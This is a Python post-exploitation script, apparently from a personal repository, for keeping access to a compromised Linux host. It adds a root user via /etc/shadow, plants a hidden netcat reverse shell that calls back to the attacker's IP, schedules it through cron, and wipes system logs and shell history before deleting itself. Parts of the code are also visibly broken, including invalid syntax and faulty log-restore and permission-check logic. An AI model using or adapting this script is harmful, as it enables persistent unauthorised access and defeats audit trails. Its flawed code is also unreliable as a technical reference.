#!/usr/bin/python3
# author: suffs811
# github: 
# purpose: script for establishing persistence on root-compromised linux machine (adding new root user and backdoor beacon on target box)
# 
# usage: python3 pers.py -u 'pepe' -p 'password' 10.0.0.1 4444


import os
import argparse


parser = argparse.ArgumentParser(description="script for adding new root user and creating callback to local machine\nusage: pers.py -u 'pepe' -p 'password' 10.0.0.1 4444")
parser.add_argument("-u", "--user", help="username for new root user", required="True")
parser.add_argument("-p", "--password", help="password for new root user", required="True")
parser.add_argument("-f", "--force", help="force bypass of root permissions check", required="False", action="store_true")
parser.add_argument("ip", help="local ip for callback", required="True")
parser.add_argument("port", help="local port for callback", required="True")
args = parser.parse_args()
username = args.user
password = args.password
local_ip = args.ip
local_port = args.port


# create backup of logs to reestablish them when finished
def disable_hist():
	print("\n### creating backups of log files... ###")
	os.system("mkdir /tmp/.backups")
        os.system("cp /var/log/auth.log /tmp/.backups/")
        os.system("cp /var/log/cron.log /tmp/.backups/")
        os.system("cp /var/log/maillog /tmp/.backups/")
        os.system("cp /var/log/httpd /tmp/.backups/")
        os.system("cp ~/.bash_history /tmp/.backups/")
        os.system("cp /root/.bash_history /tmp/.backups/")
        os.system("echo $history > /tmp/.backups/history")
        os.system("history -c")
        os.system("history -w")


# check for root permissions
perms = os.system("whoami")


is_root = ""
def perm_check(perms, is_root):
	if perms == "root":
		is_root = "True"
		return True
	else:
		is_root = "False"
		return False
		print("Error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check")
	return is_root


# call function to check for root permissions
perm_check(perms, is_root)


# add user with root perms
def add_user(username):
	if username:
		print("establishing persistence...")
		os.system(f"openssl passwd -6 {password} > /tmp/.backups/passwd.txt")
		f = open("/tmp/.backups/passwd.txt", "r")
		new_user_pass = f.read()
		os.system(f"echo '{username}:{new_user_pass}:0:0:root:/{username}:/bin/bash' >> /etc/shadow")
		print(f"user {username} added") 


# create script for nc rev shell callback
def callback(local_ip, local_port, username):
	print(f"\n### creating callback script for {local_ip}:{local_port} ###")
	os.system("mkdir /dev/shm/.data")
	os.system("touch /dev/shm/.data/data-log.sh")
	os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f' > /dev/shm/.data/data-log.sh")
	os.system("chmod 100 /dev/shm/.data/data-log.sh")
	os.system(f"chown {username}: /dev/shm/.data/")
	os.system("chmod 700 /dev/shm/.data/")

	#os.system(f"echo 'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1' > /dev/shm/.data/data-log.sh")


# create cronjob for executing callback script every 5 min
def cron_make():
	print("\n### creating cronjob to execute callback every 5 min... ###")
	os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")


# cover tracks and reestablish history logging
def clear_tracks():
        print("\n### clearing log files ###")
        os.system("echo ' ' > /var/log/auth.log")
        os.system("echo ' ' > /var/log/cron.log")
        os.system("echo ' ' > /var/log/maillog")
        os.system("echo ' ' > /var/log/httpd")
        os.system("history -c")
        os.system("history -w")
        os.system("echo ' ' > ~/.bash_history")
        os.system("echo ' ' > /root/.bash_history")

	# placing old contents back into logs
        os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
        os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
        os.system("echo /tmp/.backups/maillog > /var/log/maillog")
        os.system("echo /tmp/.backups/httpd > /var/log/httpd")
        os.system("echo /tmp/.backups/.bash_history > ~/.bash_history")
        os.system("echo /tmp/.backups/.bash_history > /root/.bash_history")
        os.system("echo /tmp/.backups/history > $history")

        print("\n### deleting data file and script... ###")
        os.system("rm -rf /tmp/.backups")
        os.system("rm -f pers.py")


# call functions
if is_root OR if args.force:
	disable_hist()
	add_user(username)
	callback(local_ip, local_port, username)
	cron_make()
	clear_tracks()
